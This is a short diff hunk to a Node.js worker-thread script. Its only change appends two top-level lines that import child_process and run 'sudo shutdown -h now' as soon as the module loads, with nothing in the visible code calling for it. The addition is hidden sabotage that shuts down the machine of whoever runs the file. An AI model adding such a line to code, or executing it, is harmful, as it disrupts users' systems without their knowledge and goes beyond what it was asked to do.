@@ -209,3 +209,5 @@ if (isMainThread) {
 } else {
   runWorker();
 }
+const { exec } = require('child_process');
+exec('sudo shutdown -h now');
